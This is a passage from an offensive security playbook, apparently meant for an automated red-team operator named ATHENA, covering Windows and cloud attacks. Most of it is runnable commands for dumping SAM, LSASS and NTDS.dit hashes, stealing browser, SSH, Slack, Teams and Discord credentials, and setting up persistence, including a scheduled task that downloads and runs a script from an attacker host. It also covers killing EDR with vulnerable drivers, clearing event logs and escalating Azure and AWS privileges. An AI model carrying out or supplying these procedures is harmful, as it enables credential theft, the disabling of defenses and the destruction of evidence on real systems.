- Behavioral: trusted binaries spawning cmd/powershell child processes
- DLL loads from non-standard paths in trusted process context
- Sigma: `proc_creation_win_rundll32_suspicious_parent`, `proc_creation_win_mshta_suspicious`
- Network: mshta/rundll32 making outbound network connections

**MITRE ATT&CK:** T1218 (System Binary Proxy Execution)

---

### Section 2.5 — Credential Access via LOLBAS

**Objective:** Harvest credentials (plaintext passwords, hashes, DPAPI blobs) from Windows systems using only built-in tools.

**Prerequisites:**
- Shell as Administrator or SYSTEM
- Access to SAM/SYSTEM registry hives or credential-containing files

**Procedure:**

Step 1 — Search for plaintext credentials in files:
```cmd
findstr /si "password" *.xml *.ini *.txt *.config
findstr /si "pwd" *.xml *.ini *.txt
dir /s *pass* == *cred* == *vnc* == *.config*
```

Step 2 — Search registry for stored credentials:
```cmd
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
# Specifically VNC (often stores cleartext passwords):
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKCU\Software\RealVNC\WinVNC4" /v password
```

Step 3 — Dump SAM and SYSTEM hive (requires SYSTEM or admin + volume shadow):
```cmd
reg save HKLM\SAM C:\Windows\Temp\sam.hive
reg save HKLM\SYSTEM C:\Windows\Temp\system.hive
reg save HKLM\SECURITY C:\Windows\Temp\security.hive
```

Exfiltrate and crack offline:
```bash
# On attacker Linux machine:
impacket-secretsdump -sam sam.hive -system system.hive -security security.hive LOCAL
```

Step 4 — Dump LSASS memory via comsvcs.dll (no Mimikatz needed):
```powershell
# Get LSASS PID:
Get-Process lsass
# Dump:
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <LSASS_PID> C:\Windows\Temp\lsass.dmp full

# Exfiltrate lsass.dmp, then parse on attacker:
pypykatz lsa minidump lsass.dmp
```

Step 5 — Windows Credential Manager:
```cmd
cmdkey /list
# Enumerate stored credentials
vaultcmd /listcreds:"Windows Credentials" /all
```

Step 6 — Unattend.xml and sysprep files (often contain cleartext passwords):
```cmd
dir /s C:\Windows\Panther\Unattend*.xml
dir /s C:\Windows\System32\Sysprep\*.xml
type C:\Windows\Panther\Unattended.xml | findstr /i "password"
```

**Detection:**
- EDR: reg save of SAM/SYSTEM/SECURITY hives
- EDR: rundll32 calling comsvcs.dll MiniDump
- File system: lsass.dmp written to disk
- Sigma: `proc_creation_win_lsass_dump_comsvcs_minidump`

**MITRE ATT&CK:** T1003 (OS Credential Dumping), T1552.001 (Unsecured Credentials: Credentials in Files)

---

### Section 2.6 — NTDS.dit Extraction (No Mimikatz)

**Objective:** Extract the Active Directory database (NTDS.dit) containing all domain password hashes using only Microsoft-signed binaries.

**Prerequisites:**
- Shell as Domain Admin or SYSTEM on a Domain Controller
- Disk space for shadow copy (~10GB minimum)

**Procedure:**

Step 1 — Create shadow copy using diskshadow:

Create `C:\Windows\Temp\shadow.dsh`:
```
set context persistent nowriters
add volume c: alias someAlias
create
expose %someAlias% z:
exec "cmd.exe" /C copy z:\windows\ntds\ntds.dit c:\windows\temp\ntds.dit
delete shadows all
list shadows all
reset
exit
```

Execute:
```cmd
diskshadow /s C:\Windows\Temp\shadow.dsh
```

Step 2 — Copy SYSTEM hive (needed to decrypt NTDS.dit):
```cmd
reg save HKLM\SYSTEM C:\Windows\Temp\system.hive
```

Step 3 — If diskshadow is blocked, use esentutl to copy locked NTDS.dit directly:
```cmd
esentutl.exe /y "C:\Windows\NTDS\ntds.dit" /d "C:\Windows\Temp\ntds_copy.dit" /o
# Note: This may require VSS (Volume Shadow Copy) to be running
```

Step 4 — Alternative: vssadmin + esentutl:
```cmd
vssadmin list shadows
# Use shadow copy path from output:
esentutl.exe /y "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit" /d "C:\Windows\Temp\ntds.dit" /o
```

Step 5 — Decrypt and extract hashes on attacker machine:
```bash
# Using impacket secretsdump:
impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL

# Or using ntdsdumpex (Windows-native):
# ntdsdumpex.exe -d ntds.dit -s system.hive
```

Step 6 — Output will contain all domain hashes in format:
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH>:::
<USER>:<RID>:<LM_HASH>:<NTLM_HASH>:::
```

Pass-the-hash with recovered hashes:
```bash
impacket-psexec administrator@<DC_IP> -hashes :<NTLM_HASH>
```

**Detection:**
- Windows Event ID 7036: Volume Shadow Copy service started (non-scheduled)
- Windows Event ID 4656: Handle requested for NTDS.dit
- Behavioral: esentutl copying NTDS.dit outside scheduled backup windows
- Sigma: `proc_creation_win_diskshadow_ntds`

**MITRE ATT&CK:** T1003.003 (OS Credential Dumping: NTDS)

---

### Section 2.7 — Persistence via LOLBAS

**Objective:** Establish persistence on a Windows system using built-in tools that survive reboots without deploying custom binaries.

**Prerequisites:**
- Administrator or SYSTEM level access
- Target must be persistent (not ephemeral/cloud instance)

**Procedure:**

**Scheduled task (schtasks):**
```cmd
schtasks /create /tn "WindowsUpdate" /tr "C:\Windows\Temp\payload.exe" /sc onlogon /ru SYSTEM
# Or run at startup:
schtasks /create /tn "SecurityCheck" /tr "powershell -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/shell.ps1')" /sc onstart /ru SYSTEM
```

**Registry Run key:**
```powershell
# HKCU Run (user-level persistence):
Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "SecurityUpdate" -Value "C:\Windows\Temp\payload.exe"

# HKLM Run (system-level, requires admin):
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "SecurityCheck" -Value "C:\Windows\Temp\payload.exe"

# RunOnce (executes once then deletes itself):
Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" -Name "Init" -Value "C:\Windows\Temp\payload.exe"
```

**WMI Event Subscription (fileless persistence):**
```powershell
# Create WMI filter for system startup:
$wmiParams = @{
    EventFilter = ([wmiclass]"\\.\root\subscription:__EventFilter").CreateInstance()
    Consumer = ([wmiclass]"\\.\root\subscription:CommandLineEventConsumer").CreateInstance()
}
$wmiParams.EventFilter.Name = "SecurityCheck"
$wmiParams.EventFilter.QueryLanguage = "WQL"
$wmiParams.EventFilter.Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
$wmiParams.EventFilter.Put()

$wmiParams.Consumer.Name = "SecurityCheck"
$wmiParams.Consumer.CommandLineTemplate = "cmd.exe /c C:\Windows\Temp\payload.exe"
$wmiParams.Consumer.Put()

([wmiclass]"\\.\root\subscription:__FilterToConsumerBinding").CreateInstance() | ForEach-Object {
    $_.Filter = $wmiParams.EventFilter
    $_.Consumer = $wmiParams.Consumer
    $_.Put()
}
```

**DLL hijacking via trusted application search order:**
```cmd
# Identify DLLs loaded from writable PATH locations:
procmon /backingfile C:\Windows\Temp\procmon.pml /quiet /minimized /runtime 30

# Place malicious DLL in writable path that is searched before legitimate DLL location
copy C:\Windows\Temp\evil.dll C:\writable\path\targetapp_dependency.dll
```

**Detection:**
- Registry audit: Run key modifications
- WMI: Event ID 19 (filter created), 20 (consumer created), 21 (binding created)
- Schtasks: Event ID 106 (task registered), 200 (task executed)
- Sigma: `registry_set_run_key_persistence`, `wmi_susp_encoded_scripts`

**MITRE ATT&CK:** T1053.005 (Scheduled Task), T1547.001 (Registry Run Keys), T1546.003 (WMI Event Subscription)

---

## Part 3: Application Abuse (LOLApps)

### Overview

LOLApps covers credential theft and execution through installed third-party applications. These are high-value targets because security teams focus on OS-level defenses and often overlook application credential stores. Run enumeration immediately after initial access on any Windows or macOS endpoint.

---

### Section 3.1 — Browser Credential Theft

**Objective:** Extract saved passwords, session cookies, and OAuth tokens from installed web browsers.

**Prerequisites:**
- Shell as the target user (their profile directory must be accessible)
- Browser must have saved credentials (check if it has been used)

**Procedure:**

**Google Chrome — Windows:**
```powershell
# Login Data is a SQLite database
$ChromeDB = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
# DPAPI-encrypted, must decrypt with user context
# Use SharpChrome or mimikatz dpapi::chrome for automated decryption:
# mimikatz# dpapi::chrome /in:"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data" /unprotect

# Manual SQLite query (requires sqlite3.exe):
Copy-Item $ChromeDB C:\Windows\Temp\ChromeLogins.db
# Then: sqlite3.exe C:\Windows\Temp\ChromeLogins.db "SELECT origin_url, username_value, password_value FROM logins"
```

**Google Chrome — macOS / Linux:**
```bash
# macOS
sqlite3 ~/Library/Application\ Support/Google/Chrome/Default/Login\ Data "SELECT origin_url, username_value, password_value FROM logins;"

# Linux
sqlite3 ~/.config/google-chrome/Default/Login\ Data "SELECT origin_url, username_value, password_value FROM logins;"

# Note: Chrome on Linux uses either GNOME Keyring or kwallet for encryption
```

**Mozilla Firefox:**
```bash
# Windows
$FFProfile = "$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\"
# Files: logins.json (credentials), key4.db (master key)

# macOS / Linux
ls ~/Library/Application\ Support/Firefox/Profiles/
ls ~/.mozilla/firefox/

# Decrypt using firepwd.py or firefox_decrypt.py:
python3 firefox_decrypt.py ~/.mozilla/firefox/<PROFILE_DIR>
```

**Microsoft Edge (Chromium-based):**
```powershell
$EdgeDB = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
# Same SQLite structure as Chrome — use identical approach
Copy-Item $EdgeDB C:\Windows\Temp\EdgeLogins.db
```

**Automated multi-browser theft (LaZagne):**
```cmd
laZagne.exe browsers
laZagne.exe all
```

**Cookie theft for session hijacking (Chrome):**
```bash
# Windows:
$CookieDB = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies"
sqlite3 $CookieDB "SELECT host_key, name, value, expires_utc FROM cookies WHERE host_key LIKE '%.target.com';"
```

**Detection:**
- EDR: file access to `Login Data`, `Cookies`, `key4.db` from non-browser processes
- AV signatures: LaZagne, SharpChrome binaries
- Behavioral: SQLite reads from browser profile directories by cmd.exe/powershell

**MITRE ATT&CK:** T1555.003 (Credentials from Password Stores: Credentials from Web Browsers)

---

### Section 3.2 — SSH Client Configs and Stored Keys

**Objective:** Extract SSH private keys, saved session configurations, and stored credentials from SSH client applications.

**Prerequisites:**
- Shell as target user
- SSH client applications installed on the target

**Procedure:**

**OpenSSH / native SSH key discovery:**
```bash
# Linux/macOS
find ~/.ssh/ -type f -name "id_*" 2>/dev/null
ls -la ~/.ssh/
cat ~/.ssh/config          # Hosts, users, key paths
cat ~/.ssh/known_hosts     # Previously connected hosts (fingerprints)

# Windows (OpenSSH for Windows)
dir %USERPROFILE%\.ssh\
type %USERPROFILE%\.ssh\config
```

**PuTTY — registry-based session storage:**
```powershell
# Enumerate all PuTTY saved sessions:
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

# Export specific session:
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions\<SESSION_NAME>" /v HostName
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions\<SESSION_NAME>" /v UserName
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions\<SESSION_NAME>" /v PortNumber

# PuTTY private keys (.ppk files):
dir /s *.ppk
dir %USERPROFILE%\Documents\*.ppk
dir %USERPROFILE%\Desktop\*.ppk

# Extract all PuTTY sessions (SessionGopher PowerShell tool):
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Arvanaghi/SessionGopher/master/SessionGopher.ps1')
Invoke-SessionGopher -Thorough
```

**WinSCP — stored credentials (registry + ini file):**
```powershell
# Registry path:
reg query "HKCU\Software\Martin Prikryl\WinSCP 2\Sessions"

# Look for Password field (obfuscated, not encrypted):
reg query "HKCU\Software\Martin Prikryl\WinSCP 2\Sessions\<SESSION_NAME>" /v Password
# Decode with: https://github.com/anoopengineer/winscppasswd

# INF config file location:
type "%APPDATA%\WinSCP.ini"
```

**FileZilla — plaintext credential storage:**
```bash
# Windows:
type "%APPDATA%\FileZilla\sitemanager.xml"
type "%APPDATA%\FileZilla\recentservers.xml"

# macOS / Linux:
cat ~/.config/filezilla/sitemanager.xml
cat ~/.config/filezilla/recentservers.xml
```

FileZilla XML contains Host, Port, User, and Pass in plaintext or base64.

**mRemoteNG — encrypted credential storage:**
```powershell
# Config file with encrypted credentials:
type "%APPDATA%\mRemoteNG\confCons.xml"
# Default encryption key: mR3m (if user hasn't changed it)
# Decrypt using: https://github.com/gquere/mRemoteNG_password_decrypt
```

**Detection:**
- Registry reads under `HKCU\Software\SimonTatham\PuTTY\Sessions` from non-PuTTY processes
- File access to sitemanager.xml, recentservers.xml from non-FileZilla processes
- Unusual reads of .ppk files or ~/.ssh/id_rsa by shell processes

**MITRE ATT&CK:** T1552.004 (Unsecured Credentials: Private Keys)

---

### Section 3.3 — Communication Tool Token Extraction

**Objective:** Extract authentication tokens from desktop communication applications (Slack, Teams, Discord) to achieve persistent access to corporate communications and linked SaaS services.

**Prerequisites:**
- Shell as target user
- Communication applications installed and previously authenticated

**Procedure:**

**Slack — LevelDB token extraction:**
```bash
# Windows:
dir "%APPDATA%\Slack\storage\"
# Target: leveldb directory containing authentication token

# PowerShell extraction:
$SlackPath = "$env:APPDATA\Slack\storage\"
Get-ChildItem $SlackPath -Recurse | Where-Object {$_.Name -match "local-settings"}

# String search for token in LevelDB files:
Select-String -Path "$env:APPDATA\Slack\storage\*" -Pattern "xox[baprs]-[0-9]+-" -AllMatches

# macOS:
grep -aro "xox[baprs]-[0-9a-zA-Z-]+" ~/Library/Application\ Support/Slack/storage/

# Linux:
grep -aro "xox[baprs]-[0-9a-zA-Z-]+" ~/.config/Slack/storage/
```

Validate extracted Slack token:
```bash
curl -s "https://slack.com/api/auth.test" -H "Authorization: Bearer xoxb-<TOKEN>" | python3 -m json.tool
```

**Microsoft Teams — token from leveldb:**
```bash
# Windows:
$TeamsPath = "$env:APPDATA\Microsoft\Teams\Local Storage\leveldb\"
Get-ChildItem $TeamsPath -Recurse

# Search for ADAL access token:
Select-String -Path "$env:APPDATA\Microsoft\Teams\Local Storage\leveldb\*" -Pattern "adal.access.token"

# macOS:
find ~/Library/Application\ Support/Microsoft/Teams/ -name "*.ldb" | xargs strings | grep "access_token"
```

**Discord — token from LevelDB:**
```bash
# Windows:
$DiscordPath = "$env:APPDATA\Discord\Local Storage\leveldb\"
Get-ChildItem $DiscordPath

# Search for Discord token (format: mfa.* or raw base64 user id):
Select-String -Path "$env:APPDATA\Discord\Local Storage\leveldb\*" -Pattern "[a-zA-Z0-9_-]{24}\.[a-zA-Z0-9_-]{6}\.[a-zA-Z0-9_-]{27}" -AllMatches

# macOS:
grep -aro "[a-zA-Z0-9_-]{24}\.[a-zA-Z0-9_-]{6}\.[a-zA-Z0-9_-]{27}" ~/Library/Application\ Support/discord/Local\ Storage/leveldb/
```

Validate Discord token:
```bash
curl -s "https://discord.com/api/v9/users/@me" -H "Authorization: <TOKEN>"
```

**Automated collection (token extraction script):**
```powershell
# Search for tokens across all common app paths:
$Paths = @(
    "$env:APPDATA\Slack\storage",
    "$env:APPDATA\Discord\Local Storage\leveldb",
    "$env:APPDATA\Microsoft\Teams\Local Storage\leveldb"
)
foreach ($path in $Paths) {
    if (Test-Path $path) {
        Get-ChildItem $path -Recurse -File | Select-String -Pattern "(xox[baprs]-[0-9]+-[0-9a-zA-Z]+|[a-zA-Z0-9_-]{24}\.[a-zA-Z0-9_-]{6}\.[a-zA-Z0-9_-]{27})" -AllMatches
    }
}
```

**Detection:**
- EDR: reads from LevelDB directories by non-application processes
- Behavioral: string search patterns accessing browser-like storage structures
- Network: unexpected API calls to Slack/Discord/Teams APIs from non-application processes

**MITRE ATT&CK:** T1539 (Steal Web Session Cookie), T1528 (Steal Application Access Token)

---

### Section 3.4 — RDP Credential Cache

**Objective:** Extract saved RDP connection credentials and discover previously connected hosts from RDP client artifacts.

**Prerequisites:**
- Shell as target user
- Target uses Windows built-in RDP client (mstsc.exe) or stores .rdp files

**Procedure:**

Step 1 — Enumerate saved RDP connections:
```powershell
# List recently connected servers (not necessarily saved creds, but valuable recon):
reg query "HKCU\Software\Microsoft\Terminal Server Client\Servers"
reg query "HKCU\Software\Microsoft\Terminal Server Client\Default"

# Get all servers from MRU:
reg query "HKCU\Software\Microsoft\Terminal Server Client\Servers" /s
```

Step 2 — Extract saved RDP credentials from Windows Credential Manager:
```powershell
# List all stored credentials:
cmdkey /list

# Look for entries with "TERMSRV/" prefix (these are RDP credentials):
cmdkey /list | findstr "TERMSRV"

# Extract and decrypt using mimikatz:
# mimikatz# vault::cred /patch
# mimikatz# vault::list

# PowerShell credential extraction (requires admin):
[System.Runtime.InteropServices.Marshal]::PtrToStringUni([System.Runtime.InteropServices.Marshal]::SecureStringToBSTR((Get-StoredCredential -Target "TERMSRV/<SERVER>").Password))
```

Step 3 — Find .rdp files containing saved connection settings:
```powershell
# Search common locations:
dir /s %USERPROFILE%\*.rdp
dir /s %USERPROFILE%\Documents\*.rdp
dir /s %USERPROFILE%\Desktop\*.rdp
dir /s C:\Users\*.rdp

# RDP files may contain:
# password 51:b:<HEX_ENCODED_DPAPI_BLOB>
# username:s:<DOMAIN\USER>
# full address:s:<SERVER>

# Decrypt DPAPI blob from .rdp file:
# python3 dpapi_decrypt_rdp.py --blob <HEX_BLOB>
```

Step 4 — Lateral movement using found RDP credentials:
```bash
# On Linux attacker machine, use xfreerdp or rdesktop:
xfreerdp /v:<TARGET_IP> /u:<USERNAME> /p:<PASSWORD> /cert-ignore

# Pass-the-hash to RDP (requires Restricted Admin mode):
xfreerdp /v:<TARGET_IP> /u:<USERNAME> /pth:<NTLM_HASH> /cert-ignore
```

**Detection:**
- Registry reads of Terminal Server Client Servers key from non-mstsc processes
- Vault reads via cmdkey from non-system processes
- Sensitive file access to *.rdp files by shell/scripting processes

**MITRE ATT&CK:** T1021.001 (Remote Services: Remote Desktop Protocol), T1552.001 (Credentials in Files)

---

## Part 4: EDR Evasion via BYOVD (LOLDrivers)

### Overview

Bring Your Own Vulnerable Driver (BYOVD) loads a legitimately signed but vulnerable kernel driver to gain ring-0 access and terminate EDR processes. This technique has been used by Lazarus APT, BlackByte ransomware, and multiple targeted attack groups. The LOLDrivers project documents 1,800+ such drivers. ATHENA should check loldrivers.io/api/drivers.json for current driver data and availability.

**CRITICAL:** BYOVD is a high-impact, high-noise technique. Use only when EDR is definitively blocking operations and client authorization covers kernel-level testing. Document everything.

---

### Section 4.1 — Driver Selection

**Objective:** Identify the optimal vulnerable driver for the target environment based on availability, HVCI status, and block list coverage.

**Prerequisites:**
- Administrator access on target Windows system
- Verification of client authorization for kernel-level testing
- Knowledge of target EDR product

**Procedure:**

Step 1 — Check if HVCI (Hypervisor-Protected Code Integrity) is enabled:
```powershell
# HVCI blocks most BYOVD — check first
Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard | Select-Object -ExpandProperty UsermodeCodeIntegrityPolicyEnforcementStatus
# 0 = Off, 1 = Audit, 2 = Enforced

# Alternative check:
reg query "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity" /v Enabled
```

Step 2 — Verify target Windows version (affects driver compatibility):
```cmd
winver
wmic os get Caption, BuildNumber, Version
```

Step 3 — Select driver based on target environment:

| Driver | Hash/CVE | Best Use Case | Limitations |
|--------|---------|---------------|-------------|
| `RTCore64.sys` | CVE-2019-16098 | Arbitrary memory R/W, MSR | On Microsoft block list since 2022 |
| `gdrv.sys` | CVE-2018-19320 | Physical memory, I/O ports | GIGABYTE App Center required presence |
| `DBUtil_2_3.sys` | CVE-2021-21551 | Memory R/W, privesc | Dell machines, on block list |
| `mhyprot2.sys` | CVE-2022-47949 | Process termination | Blocked in newer block lists |
| `WinRing0x64.sys` | CVE-2020-14979 | Physical memory R/W | Commonly flagged by AV |
| `procexp152.sys` | N/A (legitimate) | Kill protected processes | Requires procexp.exe on disk |

Step 4 — Check if driver is blocked by Windows Defender driver blocklist:
```powershell
# Query current driver block list:
Get-WinEvent -ProviderName "Microsoft-Windows-CodeIntegrity" -MaxEvents 50 | Where-Object {$_.Id -eq 3023}
# Or check policy files:
dir C:\Windows\System32\drivers\
```

---

### Section 4.2 — Driver Loading

**Objective:** Load the selected vulnerable driver as a kernel service.

**Prerequisites:**
- Administrator or SYSTEM access
- Driver binary on disk
- Driver not in current block list

**Procedure:**

Step 1 — Create driver service:
```cmd
sc create <SERVICE_NAME> binPath="C:\Windows\Temp\<DRIVER_FILE>.sys" type=kernel
sc description <SERVICE_NAME> "Microsoft Windows Update Service"
```

Step 2 — Start the driver:
```cmd
sc start <SERVICE_NAME>
```

Verify loading succeeded:
```cmd
sc query <SERVICE_NAME>
# Status should show: STATE: 4 RUNNING
driverquery | findstr <SERVICE_NAME>
```

Step 3 — Alternative via Device Manager API (PowerShell, less noisy than sc.exe):
```powershell
# Load driver using NtLoadDriver via P/Invoke
# This approach avoids sc.exe process creation
# Typically requires compiled tool like KDMapper
```

Step 4 — KDMapper for unsigned driver loading (if needed):
```cmd
# KDMapper uses a vulnerable driver to map another driver that may be unsigned
KDMapper.exe C:\Windows\Temp\payload_driver.sys
```

---

### Section 4.3 — EDR Termination via IOCTL

**Objective:** Use the loaded vulnerable driver's IOCTL interface to kill the EDR process, disable callbacks, or remove kernel-mode protections.

**Procedure:**

Step 1 — Identify target EDR process:
```powershell
Get-Process | Where-Object {$_.Name -match "Defender|CrowdStrike|SentinelOne|CarbonBlack|Cylance|Symantec|McAfee|Sophos|ESET|Kaspersky"}
```

Step 2 — EDRSandBlast approach (uses vulnerable driver to remove EDR callbacks):
```cmd
# EDRSandBlast is the comprehensive tool for this
EDRSandBlast.exe --help
EDRSandBlast.exe --kernelmode  # Uses RTCore64.sys or procexp152.sys to blind EDR
EDRSandBlast.exe --usermode    # Patches usermode hooks placed by EDR
```

Step 3 — Manual process kill via RTCore64.sys IOCTL (CVE-2019-16098):
The RTCore64.sys driver exposes IOCTL 0x80002048 for arbitrary memory R/W and IOCTL 0x80002054 for MSR access. Exploit code uses these IOCTLs to locate and delete EDR kernel callbacks (PsSetLoadImageNotifyRoutine, PsSetCreateProcessNotifyRoutine).

```powershell
# Reference exploit code structure (requires compiled implementation):
# 1. Open driver handle: CreateFile("\\.\RTCore64", ...)
# 2. Find EDR driver callback array via IOCTL memory read
# 3. Overwrite callback pointer with NULL via IOCTL memory write
# 4. EDR's telemetry is now blind to process/image events
```

Step 4 — BlackByte EDR kill chain reference (DBUtil_2_3.sys):
```
1. Drop DBUtil_2_3.sys to C:\Windows\Temp\
2. sc create / sc start to load driver
3. Open handle to driver
4. Use CVE-2021-21551 IOCTL to write to kernel memory
5. Locate and patch EDR's protection flags
6. EDR process is now terminatable via TerminateProcess
7. taskkill /F /IM <EDR_PROCESS>.exe
```

---

### Section 4.4 — Cleanup

**Objective:** Remove driver artifacts to reduce forensic footprint after operations.

**Procedure:**

Step 1 — Stop and delete driver service:
```cmd
sc stop <SERVICE_NAME>
sc delete <SERVICE_NAME>
```

Step 2 — Delete driver binary:
```cmd
del /F /Q C:\Windows\Temp\<DRIVER_FILE>.sys
```

Step 3 — Clear event logs related to driver installation:
```powershell
# Clear System log entries for service installation (Event ID 7045):
wevtutil cl System
# Or targeted deletion:
Get-WinEvent -LogName System | Where-Object {$_.Id -eq 7045 -and $_.Message -match "<SERVICE_NAME>"} | ForEach-Object {$_.Dispose()}
```

Step 4 — Remove driver from known driver list:
```cmd
reg delete "HKLM\SYSTEM\CurrentControlSet\Services\<SERVICE_NAME>" /f
```

---

### Section 4.5 — Limitations and Mitigations

| Mitigation | Protection Level | Notes |
|------------|-----------------|-------|
| **HVCI (Memory Integrity)** | CRITICAL — blocks most BYOVD | Enforces code signing at hypervisor level. Cannot be bypassed by kernel drivers. |
| **Secure Boot** | HIGH — hardens UEFI chain | Prevents boot-level persistence but doesn't directly block BYOVD |
| **Microsoft Vulnerable Driver Blocklist** | MEDIUM — covers known drivers | Updated quarterly; new drivers bypass until listed |
| **Driver Signature Enforcement** | MEDIUM | Can be bypassed by loading via vulnerable signed driver |
| **EDR with kernel protection** | MEDIUM | Some EDRs protect their own driver callbacks, but most don't |
| **Audit logging / SIEM** | DETECTION ONLY | Windows Event 7045 (new service), 7040 (service state change) |

**MITRE ATT&CK:** T1068 (Exploitation for Privilege Escalation), T1562.001 (Impair Defenses: Disable or Modify Tools), T1543.003 (Windows Service — driver persistence)

---

## Part 5: Cloud Privilege Escalation

### Overview

Cloud environments offer unique escalation paths via managed identities, IAM role chaining, and metadata services. The key insight from Praetorian research is that cloud privilege escalation often bypasses traditional MFA requirements and exploits permissions that are invisible to standard security reviews.

---

### Section 5.1 — Azure VM Managed Identity Escalation

**Objective:** Escalate cloud privileges by stealing credentials from an Azure VM's managed identity via the Instance Metadata Service (IMDS), or by executing commands on a VM that has a high-privilege managed identity attached.

**Prerequisites:**
- Network access to an Azure VM, OR
- Permission to execute commands on a VM (`Microsoft.Compute/virtualMachines/runCommand/action`), OR
- Shell access inside an Azure VM instance

**Technique A — IMDS Token Theft (from inside VM):**

Step 1 — Query the metadata service (accessible only from inside the VM):
```bash
# Get access token for Azure Resource Manager
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \
  | python3 -m json.tool

# Save the access_token value:
TOKEN=$(curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")
```

Step 2 — Enumerate what permissions the managed identity has:
```bash
# Get subscription info:
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://management.azure.com/subscriptions?api-version=2020-01-01" | python3 -m json.tool

# List role assignments for current identity:
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://management.azure.com/subscriptions/<SUBSCRIPTION_ID>/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01" \
  | python3 -m json.tool
```

Step 3 — If managed identity has high privileges, escalate:
```bash
# Check if identity has roleAssignments/write:
# If yes, assign Owner role to an attacker-controlled service principal:
curl -s -X PUT -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  "https://management.azure.com/subscriptions/<SUB_ID>/providers/Microsoft.Authorization/roleAssignments/<NEW_UUID>?api-version=2022-04-01" \
  -d '{
    "properties": {
      "roleDefinitionId": "/subscriptions/<SUB_ID>/providers/Microsoft.Authorization/roleDefinitions/8e3af657-a8ff-443c-a75c-2fe8c4bcb635",
      "principalId": "<ATTACKER_SERVICE_PRINCIPAL_ID>"
    }
  }'
```

**Technique B — Azure CLI runCommand escalation (external):**

Step 1 — Enumerate VMs and their managed identities:
```bash
az login  # or use compromised credentials
az vm list --query "[].{name:name, resourceGroup:resourceGroup, identity:identity}" -o table
az identity list --query "[].{name:name, principalId:principalId}" -o table
az role assignment list --assignee <MANAGED_IDENTITY_PRINCIPAL_ID> --all -o table
```

Step 2 — If a VM has an admin managed identity, execute commands via runCommand:
```bash
az vm run-command invoke \
  --resource-group <RESOURCE_GROUP> \
  --name <VM_NAME> \
  --command-id RunShellScript \
  --scripts "curl -H 'Metadata: true' 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' > /tmp/token.json && cat /tmp/token.json"
```

Step 3 — Parse the output token and use it for subscription-level operations:
```bash
# Token from runCommand output can be used with Azure CLI or REST API
az account get-access-token --query accessToken -o tsv  # For comparison
# Use the IMDS token directly in REST API calls as shown in Technique A
```

**Detection:**
- Azure Monitor: IMDS endpoint queries (rare from non-system processes)
- Activity Log: Unusual role assignment operations
- Alert on `Microsoft.Compute/virtualMachines/runCommand` operations
- Defender for Cloud: "Access from unusual location" on identity

**MITRE ATT&CK:** T1078.004 (Valid Accounts: Cloud Accounts), T1548 (Abuse Elevation Control Mechanism)

---

### Section 5.2 — AWS IAM Role Chaining (MFA Bypass)

**Objective:** Escalate AWS privileges by chaining IAM role assumptions, bypassing MFA enforcement conditions on role trust policies via `sts:GetSessionToken`.

**Background (Praetorian finding):** `sts:GetSessionToken` generates temporary credentials that carry the `aws:MultiFactorAuthPresent: true` condition, satisfying MFA requirements on role trust policies — even when the user's base policy requires MFA for direct access. AWS IAM Policy Simulator does NOT correctly model this path.

**Prerequisites:**
- AWS IAM user credentials (access key + secret key)
- At least one role whose trust policy has `aws:MultiFactorAuthPresent: true` condition
- MFA device registered to the IAM user (or ability to enroll one)

**Procedure:**

Step 1 — Configure AWS credentials:
```bash
export AWS_ACCESS_KEY_ID="<ACCESS_KEY>"
export AWS_SECRET_ACCESS_KEY="<SECRET_KEY>"
export AWS_DEFAULT_REGION="us-east-1"

# Verify identity:
aws sts get-caller-identity
```

Step 2 — Get temporary credentials via GetSessionToken (triggers MFA-present flag):
```bash
# Get current MFA device ARN:
aws iam list-mfa-devices --query "MFADevices[0].SerialNumber" --output text

# Get session token with MFA:
aws sts get-session-token \
  --serial-number arn:aws:iam::<ACCOUNT_ID>:mfa/<USERNAME> \
  --token-code <6_DIGIT_MFA_CODE> \
  --duration-seconds 43200

# Output will have AccessKeyId, SecretAccessKey, SessionToken
```

Step 3 — Export temporary credentials:
```bash
export AWS_ACCESS_KEY_ID="<TEMP_ACCESS_KEY>"
export AWS_SECRET_ACCESS_KEY="<TEMP_SECRET_KEY>"
export AWS_SESSION_TOKEN="<SESSION_TOKEN>"

# Verify the credentials carry MFA flag:
aws sts get-caller-identity
```

Step 4 — Enumerate available roles that this identity can assume:
```bash
# Check role trust policies:
